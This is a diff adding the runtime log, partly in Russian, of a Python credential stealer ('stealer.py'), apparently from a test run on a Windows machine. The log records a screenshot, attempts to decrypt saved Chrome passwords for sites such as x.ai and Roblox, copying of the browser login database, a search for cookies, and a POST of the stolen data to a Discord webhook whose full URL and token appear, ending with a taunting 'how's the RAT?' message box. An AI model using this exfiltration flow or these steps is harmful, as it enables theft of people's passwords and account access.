@@ -1,0 +1,22 @@
+2025-05-04 21:22:20,844 - INFO - Скриншот сохранён как screenshot.png
+2025-05-04 21:22:21,068 - WARNING - Не удалось расшифровать пароль для https://accounts.x.ai/sign-up: (87, 'CryptUnprotectData', 'Параметр задан неверно.')
+2025-05-04 21:22:21,068 - WARNING - Не удалось расшифровать пароль для https://www.roblox.com/login: (87, 'CryptUnprotectData', 'Параметр задан неверно.')
+2025-05-04 21:22:21,068 - WARNING - Не удалось расшифровать пароль для https://minecraft-cheats-site.onrender.com/: (87, 'CryptUnprotectData', 'Параметр задан неверно.')
+2025-05-04 21:22:21,069 - WARNING - Не удалось удалить LoginData.db: [WinError 32] Процесс не может получить доступ к файлу, так как этот файл занят другим процессом: 'C:\\Users\\USER\\AppData\\Local\\Temp\\tmpi8j6x9x1.db'
+2025-05-04 21:22:22,070 - WARNING - Не удалось удалить LoginData.db: [WinError 32] Процесс не может получить доступ к файлу, так как этот файл занят другим процессом: 'C:\\Users\\USER\\AppData\\Local\\Temp\\tmpi8j6x9x1.db'
+2025-05-04 21:22:23,071 - WARNING - Не удалось удалить LoginData.db: [WinError 32] Процесс не может получить доступ к файлу, так как этот файл занят другим процессом: 'C:\\Users\\USER\\AppData\\Local\\Temp\\tmpi8j6x9x1.db'
+2025-05-04 21:22:24,073 - WARNING - Не удалось удалить LoginData.db: [WinError 32] Процесс не может получить доступ к файлу, так как этот файл занят другим процессом: 'C:\\Users\\USER\\AppData\\Local\\Temp\\tmpi8j6x9x1.db'
+2025-05-04 21:22:25,074 - WARNING - Не удалось удалить LoginData.db: [WinError 32] Процесс не может получить доступ к файлу, так как этот файл занят другим процессом: 'C:\\Users\\USER\\AppData\\Local\\Temp\\tmpi8j6x9x1.db'
+2025-05-04 21:22:26,076 - WARNING - Chrome Cookies database not found
+2025-05-04 21:22:26,893 - DEBUG - Starting new HTTPS connection (1): discord.com:443
+2025-05-04 21:22:27,521 - DEBUG - https://discord.com:443 "POST /api/webhooks/1354501574440910993/JtAT0CqjLLuVm6PskbqbSqbTvnIr3FBVX3fOFj4jfrRYCmmBwDPxxoIyOBpkfxRi8P5_ HTTP/1.1" 404 45
+2025-05-04 21:22:27,621 - ERROR - Ошибка в send_to_discord: 404 Client Error: Not Found for url: https://discord.com/api/webhooks/1354501574440910993/JtAT0CqjLLuVm6PskbqbSqbTvnIr3FBVX3fOFj4jfrRYCmmBwDPxxoIyOBpkfxRi8P5_
+Traceback (most recent call last):
+  File "C:\Users\USER\Desktop\stealer.py", line 186, in send_to_discord
+    response.raise_for_status()  # Проверяем успешность запроса
+    ~~~~~~~~~~~~~~~~~~~~~~~~~^^
+  File "C:\Users\USER\AppData\Local\Programs\Python\Python313\Lib\site-packages\requests\models.py", line 1024, in raise_for_status
+    raise HTTPError(http_error_msg, response=self)
+requests.exceptions.HTTPError: 404 Client Error: Not Found for url: https://discord.com/api/webhooks/1354501574440910993/JtAT0CqjLLuVm6PskbqbSqbTvnIr3FBVX3fOFj4jfrRYCmmBwDPxxoIyOBpkfxRi8P5_
+
+2025-05-04 21:22:29,266 - INFO - Message box 'ну как там ратка?' отображён
